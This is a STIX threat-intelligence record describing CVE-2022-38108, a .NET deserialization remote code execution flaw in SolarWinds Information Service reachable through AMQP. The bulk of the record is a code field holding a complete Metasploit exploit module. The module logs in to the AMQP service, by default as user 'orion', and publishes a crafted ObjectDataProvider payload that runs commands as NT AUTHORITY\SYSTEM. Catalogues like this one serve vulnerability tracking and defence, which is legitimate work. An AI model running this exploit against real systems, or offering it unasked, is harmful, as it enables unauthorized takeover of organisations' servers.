{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6710a00-401f-44a5-9ec3-7c08321314e2",
    "created": "2024-08-14T16:46:29.097279Z",
    "modified": "2024-08-14T16:46:29.097284Z",
    "name": "SolarWinds Information Service (SWIS) .NET Deserialization From AMQP RCE",
    "description": " The SolarWinds Information Service (SWIS) is vulnerable to RCE by way of a crafted message received through the AMQP message queue. A malicious user that can authenticate to the AMQP service can publish such a crafted message whose body is a serialized .NET object which can lead to OS command execution as NT AUTHORITY\\SYSTEM. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/solarwinds_amqp_deserialization.rb",
            "external_id": "solarwinds_amqp_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-38108"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/blog/2023/2/27/cve-2022-38108-rce-in-solarwinds-network-performance-monitor"
        },
        {
            "source_name": "reference",
            "url": "https://www.solarwinds.com/trust-center/security-advisories/cve-2022-38108"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/proto/amqp/version_0_9_1'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  def initialize\n    super(\n      'Name' => 'SolarWinds Information Service (SWIS) .NET Deserialization From AMQP RCE',\n      'Description' => %q{\n        The SolarWinds Information Service (SWIS) is vulnerable to RCE by way of a crafted message received through the\n        AMQP message queue. A malicious user that can authenticate to the AMQP service can publish such a crafted\n        message whose body is a serialized .NET object which can lead to OS command execution as NT AUTHORITY\\SYSTEM.\n      },\n      'Author' => [\n        'Justin Hong', # vulnerability research, Trend Micro\n        'Lucas Miller', # vulnerability research, Trend Micro\n        'Piotr Bazyd\u0142o', # vulnerability discovery, reported to ZDI\n        'Spencer McIntyre' # metasploit module\n      ],\n      'Arch' => ARCH_CMD,\n      'Platform' => 'win',\n      'References' => [\n        [ 'CVE', '2022-38108' ],\n        [ 'URL', 'https://www.zerodayinitiative.com/blog/2023/2/27/cve-2022-38108-rce-in-solarwinds-network-performance-monitor' ],\n        [ 'URL', 'https://www.solarwinds.com/trust-center/security-advisories/cve-2022-38108' ]\n      ],\n      'DefaultOptions' => {\n        'WfsDelay' => 10\n      },\n      'Targets' => [\n        [ 'Automatic', {} ]\n      ],\n      'DefaultTarget' => 0,\n      'Privileged' => true,\n      'DisclosureDate' => '2022-10-19',\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'Reliability' => [REPEATABLE_SESSION],\n        'SideEffects' => [IOC_IN_LOGS]\n      }\n    )\n\n    register_options([\n      Opt::RHOST,\n      Opt::RPORT(5671),\n      OptString.new('USERNAME', [true, 'The username to authenticate with', 'orion']),\n      OptString.new('PASSWORD', [true, 'The password to authenticate with', ''])\n    ])\n\n    register_advanced_options(\n      [\n        OptBool.new('SSL', [ true, 'Negotiate SSL/TLS for outgoing connections', true ]),\n        Opt::SSLVersion\n      ]\n    )\n  end\n\n  def peer\n    rhost = datastore['RHOST']\n    rport = datastore['RPORT']\n    if Rex::Socket.is_ipv6?(rhost)\n      \"[#{rhost}]:#{rport}\"\n    else\n      \"#{rhost}:#{rport}\"\n    end\n  end\n\n  def print_status(msg)\n    msg = \"#{peer} - #{msg}\"\n    super\n  end\n\n  def exploit\n    amqp_client = Rex::Proto::Amqp::Version091::Client.new(\n      datastore['RHOST'],\n      port: datastore['RPORT'],\n      context: { 'Msf' => framework, 'MsfExploit' => self },\n      ssl: datastore['SSL'],\n      ssl_version: datastore['SSLVersion']\n    )\n\n    unless amqp_client.login(datastore['USERNAME'], datastore['PASSWORD'])\n      fail_with(Failure::NoAccess, \"Authentication failed for user #{datastore['USERNAME']}.\")\n    end\n    print_status('Successfully connected to the remote server.')\n\n    channel = amqp_client.channel_open\n    vprint_status('Successfully opened a new channel.')\n    channel.basic_publish(\n      routing_key: 'SwisPubSub',\n      message: ::Msf::Util::DotNetDeserialization.generate(\n        payload.encoded,\n        gadget_chain: :ObjectDataProvider,\n        formatter: :JsonNetFormatter\n      ),\n      properties: {\n        message_type: 'System.Windows.Data.ObjectDataProvider'\n      }\n    )\n    print_status('Successfully published the message to the channel.')\n\n    channel.close\n    amqp_client.connection_close\n  rescue Rex::Proto::Amqp::Error::UnexpectedReplyError => e\n    fail_with(Failure::UnexpectedReply, e.message)\n  rescue Rex::Proto::Amqp::Error::AmqpError => e\n    fail_with(Failure::Unknown, e.message)\n  ensure\n    amqp_client.close\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-10-19",
    "x_mitre_platforms": [
        "win'"
    ]
}